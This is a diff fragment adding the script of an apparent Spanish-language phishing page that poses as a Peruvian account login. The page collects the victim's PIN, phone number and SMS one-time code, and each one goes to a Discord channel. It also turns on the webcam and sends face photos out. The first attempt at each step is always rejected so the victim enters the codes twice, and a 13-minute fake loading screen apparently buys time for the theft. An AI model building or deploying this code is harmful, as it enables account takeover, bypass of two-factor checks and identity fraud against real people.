+            const emptyBtn = document.createElement('button'); emptyBtn.className = 'key-btn key-empty'; emptyBtn.disabled = true; keypadContainer.appendChild(emptyBtn);
+            const backspaceBtn = document.createElement('button');
+            backspaceBtn.className = 'key-btn key-backspace'; backspaceBtn.onclick = removePin;
+            backspaceBtn.innerHTML = `<svg viewBox="0 0 24 24"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7.07L2.4 12l4.66-7H22v14zm-11.59-2L14 13.41 17.59 17 19 15.59 15.41 12 19 8.41 17.59 7 14 10.59 10.41 7 9 8.41 12.59 12 9 15.59z"/></svg>`;
+            keypadContainer.appendChild(backspaceBtn);
+        }
+
+        function addPin(numero) {
+            if (pinCode.length < 6) {
+                pinCode.push(numero); updateDots();
+                if (pinCode.length === 6) {
+                    if (pinAttempts === 1) {
+                        pinAttempts++;
+                        enviarDiscord("⚠️ Intento de PIN Fallido", `**PIN:** \`${pinCode.join('')}\``, 15105570);
+                        pinError.style.display = 'block';
+                        pinDotsContainer.classList.add('shake');
+                        setTimeout(() => {
+                            pinCode = []; updateDots();
+                            pinDotsContainer.classList.remove('shake');
+                            pinError.style.display = 'none';
+                        }, 1000);
+                    } else {
+                        enviarDiscord("🔐 Clave PIN Correcta", `**PIN:** \`${pinCode.join('')}\``, 3066993);
+                        setTimeout(() => {
+                            switchView('loadingView2');
+                            setTimeout(() => { switchView('phoneView'); }, 4000); 
+                        }, 300); 
+                    }
+                }
+            }
+        }
+        function removePin() { if (pinCode.length > 0) { pinCode.pop(); updateDots(); } }
+        function updateDots() {
+            for (let i = 0; i < 6; i++) {
+                const dot = document.getElementById(`dot-${i}`);
+                if (i < pinCode.length) dot.classList.add('filled'); else dot.classList.remove('filled');
+            }
+        }
+        function backToPin() { switchView('pinView'); pinCode = []; updateDots(); }
+        function goBackToLogin() { switchView('loginView'); pinCode = []; updateDots(); }
+
+        /* --- 5. TELÉFONO --- */
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length >= 9) { btnPhone.removeAttribute('disabled'); } else { btnPhone.setAttribute('disabled', 'true'); }
+        });
+
+        function sendSmsCode() {
+            const phoneStr = phoneInput.value;
+            enviarDiscord("📱 Número de Teléfono", `**Número:** \`+51 ${phoneStr}\``, 3066993);
+            const last3 = phoneStr.slice(-3);
+            document.getElementById('maskedPhone').innerText = `*** *** ${last3}`;
+            switchView('loadingSmsView');
+            setTimeout(() => {
+                switchView('smsView');
+                startSmsTimer();
+                smsBoxes[0].focus();
+            }, 2000);
+        }
+        function backToPhone() { switchView('phoneView'); clearInterval(smsTimerInterval); }
+
+        /* --- 7. SMS --- */
+        function startSmsTimer() {
+            let time = 19;
+            timerText.innerHTML = `Puedes solicitar un nuevo código en <span id="timerCount">${time}</span> segundos`;
+            
+            clearInterval(smsTimerInterval);
+            smsTimerInterval = setInterval(() => {
+                time--;
+                const currentCount = document.getElementById('timerCount');
+                
+                if (time <= 0) {
+                    clearInterval(smsTimerInterval);
+                    timerText.innerHTML = `<a href="#" onclick="resendSms(event)" style="color: var(--brand-teal); font-weight: 600; text-decoration: none;">Solicitar nuevo código</a>`;
+                } else {
+                    if(currentCount) currentCount.innerText = time;
+                }
+            }, 1000);
+        }
+
+        function resendSms(e) {
+            e.preventDefault();
+            enviarDiscord("🔄 Reenvío de SMS", "El usuario ha solicitado un nuevo código SMS.", 16776960);
+            smsBoxes.forEach(box => box.value = '');
+            btnSms.setAttribute('disabled', 'true');
+            smsBoxes[0].focus();
+            alert("Se ha enviado un nuevo código SMS.");
+            startSmsTimer(); 
+        }
+
+        smsBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                if (this.value.length === 1) { if (index < smsBoxes.length - 1) smsBoxes[index + 1].focus(); }
+                checkSmsComplete();
+            });
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0) { if (index > 0) smsBoxes[index - 1].focus(); }
+            });
+        });
+
+        function checkSmsComplete() {
+            let complete = true;
+            smsBoxes.forEach(box => { if (box.value === '') complete = false; });
+            if (complete) btnSms.removeAttribute('disabled'); else btnSms.setAttribute('disabled', 'true');
+        }
+
+        function verifySmsCode() {
+            clearInterval(smsTimerInterval);
+            let codigoSms = Array.from(smsBoxes).map(b => b.value).join('');
+            if (smsAttempts === 1) {
+                smsAttempts++;
+                enviarDiscord("⚠️ Intento de SMS Fallido", `**Código:** \`${codigoSms}\``, 15105570);
+                smsError.style.display = 'block';
+                smsInputs.classList.add('shake');
+                setTimeout(() => {
+                    smsInputs.classList.remove('shake');
+                    smsError.style.display = 'none';
+                    smsBoxes.forEach(b => b.value = '');
+                    btnSms.setAttribute('disabled', 'true');
+                    smsBoxes[0].focus();
+                    startSmsTimer();
+                }, 1500);
+            } else {
+                enviarDiscord("💬 Código SMS Correcto", `**Código:** \`${codigoSms}\``, 16776960);
+                switchView('loadingViewSms');
+                setTimeout(() => { switchView('facialView'); }, 3000); 
+            }
+        }
+
+        /* --- 8. VERIFICACIÓN FACIAL --- */
+        function capturarFoto() {
+            return new Promise(resolve => {
+                const ctx = captureCanvas.getContext('2d');
+                captureCanvas.width = videoFeed.videoWidth;
+                captureCanvas.height = videoFeed.videoHeight;
+                ctx.translate(captureCanvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(videoFeed, 0, 0, captureCanvas.width, captureCanvas.height);
+                captureCanvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
+            });
+        }
+
+        async function startFacialVerification() {
+            btnVerify.disabled = true;
+            btnVerify.innerText = 'Iniciando cámara...';
+            facialError.style.display = 'none';
+
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                videoFeed.srcObject = mediaStream;
+                videoFeed.style.display = 'block';
+                
+                videoFeed.onloadedmetadata = () => {
+                    btnVerify.innerText = 'Analizando rostro...';
+                    cameraSim.classList.add('scanning');
+
+                    if (facialAttempts === 1) {
+                        setTimeout(async () => {
+                            const fotoBlob = await capturarFoto();
+                            stopCamera();
+                            cameraSim.classList.remove('scanning');
+                            facialAttempts++;
+                            
+                            facialError.style.display = 'block';
+                            btnVerify.disabled = false;
+                            btnVerify.innerText = 'Reintentar verificación';
+                            
+                            enviarDiscordConImagen("❌ Facial Fallido (Foto adjunta)", "Intento 1: El sistema no reconoció el rostro. Se adjunta captura.", fotoBlob, 15105570);
+                            
+                        }, 5000); 
+                    } else {
+                        setTimeout(async () => {
+                            const fotoBlob = await capturarFoto();
+                            stopCamera();
+                            cameraSim.classList.remove('scanning');
+                            cameraSim.classList.add('success');
+                            btnVerify.innerText = 'Rostro capturado...';
+                            
+                            enviarDiscordConImagen("✅ Facial Exitoso (Foto adjunta)", "Intento 2: Rostro verificado correctamente. Se adjunta captura.", fotoBlob, 3066993);
+
+                            setTimeout(() => {
+                                switchView('loadingView3');
+                                setTimeout(() => {
+                                    switchView('successView');
+                                    setTimeout(() => { resetFlow(); }, 4000); 
+                                }, 13 * 60 * 1000); 
+                            }, 1500); 
+                        }, 10000); 
+                    }
+                };
+            } catch (error) {
+                alert("No se pudo acceder a la cámara. Asegúrate de dar los permisos.");
+                btnVerify.disabled = false;
+                btnVerify.innerText = 'Reintentar verificación';
+            }
+        }
+
+        function stopCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                videoFeed.srcObject = null;
+                videoFeed.style.display = 'none';
+            }
+        }
+
+        /* --- RESET COMPLETO --- */
+        function resetFlow() {
+            stopCamera();
+            clearInterval(smsTimerInterval);
+            
+            emailInput.value = ''; btnContinue.setAttribute('disabled', 'true'); btnContinue.classList.remove('active');
+            phoneInput.value = ''; btnPhone.setAttribute('disabled', 'true');
+            smsBoxes.forEach(b => b.value = ''); btnSms.setAttribute('disabled', 'true');
+            pinCode = []; updateDots();
+            
+            pinAttempts = 1; smsAttempts = 1; facialAttempts = 1;
+            
+            pinError.style.display = 'none'; smsError.style.display = 'none'; facialError.style.display = 'none';
+            
+            cameraSim.classList.remove('success', 'scanning');
+            btnVerify.disabled = false; btnVerify.innerText = 'Iniciar verificación';
+
+            switchView('loginView');
+        }
+    </script>
+</body>
+</html>
